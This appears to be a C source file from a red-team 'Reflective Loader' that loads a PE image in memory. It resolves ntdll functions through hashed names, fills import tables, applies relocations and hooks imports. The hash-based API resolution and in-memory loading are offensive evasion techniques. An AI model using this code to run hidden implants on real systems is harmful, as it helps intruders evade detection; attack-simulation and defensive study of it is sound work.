/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack SimulatioN
 *
**/

#include "Common.h"

typedef struct
{
	WORD	Offset	: 0xc;
	WORD	Type	: 0x4;
} IMAGE_RELOC, *PIMAGE_RELOC ;

typedef struct
{
	D_API( RtlAnsiStringToUnicodeString );
	D_API( LdrGetProcedureAddress );
	D_API( RtlFreeUnicodeString );
	D_API( RtlInitAnsiString );
	D_API( LdrLoadDll );
} API;

#define H_API_RTLANSISTRINGTOUNICODESTRING      0x6c606cba /* RtlAnsiStringToUnicodeString */
#define H_API_LDRGETPROCEDUREADDRESS            0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_RTLFREEUNICODESTRING              0x61b88f97 /* RtlFreeUnicodeString */
#define H_API_RTLINITANSISTRING                 0xa0c8436d /* RtlInitAnsiString */
#define H_API_LDRLOADDLL                        0x9e456a43 /* LdrLoadDll */
#define H_LIB_NTDLL                             0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Resolves the required imports and fills
 * in their respective entries.
 *
!*/

D_SEC( E ) VOID LdrProcessIat( _In_ PVOID Image, _In_ PVOID Directory )
{
	API				Api;
	ANSI_STRING			Ani;
	UNICODE_STRING			Unm;

	PVOID				Mod = NULL;
	PVOID				Fcn = NULL;
	PIMAGE_THUNK_DATA		Otd = NULL;
	PIMAGE_THUNK_DATA		Ntd = NULL;
	PIMAGE_IMPORT_BY_NAME		Ibn = NULL;
	PIMAGE_IMPORT_DESCRIPTOR	Imp = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Unm, sizeof( Unm ) );

	Api.RtlAnsiStringToUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLANSISTRINGTOUNICODESTRING );
	Api.LdrGetProcedureAddress       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.RtlFreeUnicodeString         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEUNICODESTRING );
	Api.RtlInitAnsiString            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.LdrLoadDll                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Enumerate the directory. */
	for ( Imp = C_PTR( Directory ) ; Imp->Name != 0 ; ++Imp ) {
		Api.RtlInitAnsiString( &Ani, C_PTR( U_PTR( Image ) + Imp->Name ) );

		if ( NT_SUCCESS( Api.RtlAnsiStringToUnicodeString( &Unm, &Ani, TRUE ) ) ) {
			if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Unm, &Mod ) ) ) {
				Otd = C_PTR( U_PTR( Image ) + Imp->OriginalFirstThunk );
				Ntd = C_PTR( U_PTR( Image ) + Imp->FirstThunk );

				/* Enumerate Function Imports */
				for ( ; Otd->u1.AddressOfData != 0 ; ++Otd, ++Ntd ) {
					if ( IMAGE_SNAP_BY_ORDINAL( Otd->u1.Ordinal ) ) {
						/* Is Integer? Import */
						if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Mod, NULL, IMAGE_ORDINAL( Otd->u1.Ordinal ), &Fcn ) ) ) {
							Ntd->u1.Function = Fcn;
						};
					} else {
						/* Is String? Import */
						Ibn = C_PTR( U_PTR( Image ) + Otd->u1.AddressOfData );
						Api.RtlInitAnsiString( &Ani, C_PTR( Ibn->Name ) );

						if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Mod, &Ani, 0, &Fcn ) ) ) {
							Ntd->u1.Function = Fcn;
						};
					};
				};
			};
			Api.RtlFreeUnicodeString( &Unm );
		};
	};
};

/*!
 *
 * Purpose:
 *
 * Relocates the PE based on its relative base.
 *
!*/

D_SEC( E ) VOID LdrProcessRel( _In_ PVOID Image, _In_ PVOID Directory, _In_ PVOID ImageBase )
{
	ULONG_PTR		Ofs = 0;

	PIMAGE_RELOC		Rel = NULL;
	PIMAGE_BASE_RELOCATION	Ibr = NULL;

	Ibr = C_PTR( Directory );
	Ofs = C_PTR( U_PTR( Image ) - U_PTR( ImageBase ) );

	/* Is a relocation! */
	while ( Ibr->VirtualAddress != 0 ) {
		Rel = ( PIMAGE_RELOC )( Ibr + 1 );

		/* Exceed the size of the relocation? */
		while ( C_PTR( Rel ) != C_PTR( U_PTR( Ibr ) + Ibr->SizeOfBlock ) ) {
			switch( Rel->Type ) {
				/* 8 wide */
				case IMAGE_REL_BASED_DIR64:
					*( DWORD64 * )( U_PTR( Image ) + Ibr->VirtualAddress + Rel->Offset ) += ( DWORD64 )( Ofs );
					break;
				/* 4 wide */
				case IMAGE_REL_BASED_HIGHLOW:
					*( DWORD32 * )( U_PTR( Image ) + Ibr->VirtualAddress + Rel->Offset ) += ( DWORD32 )( Ofs );
					break;
			};
			++Rel;
		};
		Ibr = C_PTR( Rel );
	};
};

/*!
 *
 * Purpose:
 *
 * Applies a hook the import table of a PE.
 *
!*/

D_SEC( E ) VOID LdrHookImport( _In_ PVOID Image, _In_ PVOID Directory, _In_ ULONG Hash, _In_ PVOID Function ) 
{
	ULONG				Djb = 0;

	PIMAGE_THUNK_DATA		Otd = NULL;
	PIMAGE_THUNK_DATA		Ntd = NULL;
	PIMAGE_IMPORT_BY_NAME		Ibn = NULL;
	PIMAGE_IMPORT_DESCRIPTOR	Imp = NULL;

	for ( Imp = C_PTR( Directory ) ; Imp->Name != 0 ; ++Imp ) {
		Otd = C_PTR( U_PTR( Image ) + Imp->OriginalFirstThunk );
		Ntd = C_PTR( U_PTR( Image ) + Imp->FirstThunk );

		for ( ; Otd->u1.AddressOfData != 0 ; ++Otd, ++Ntd ) {
			if ( ! IMAGE_SNAP_BY_ORDINAL( Otd->u1.Ordinal ) ) {
				Ibn = C_PTR( U_PTR( Image ) + Otd->u1.AddressOfData );
				Djb = HashString( Ibn->Name, 0 );

				if ( Djb == Hash ) {
					Ntd->u1.Function = C_PTR( Function );
				};
			};
		};
	};
};
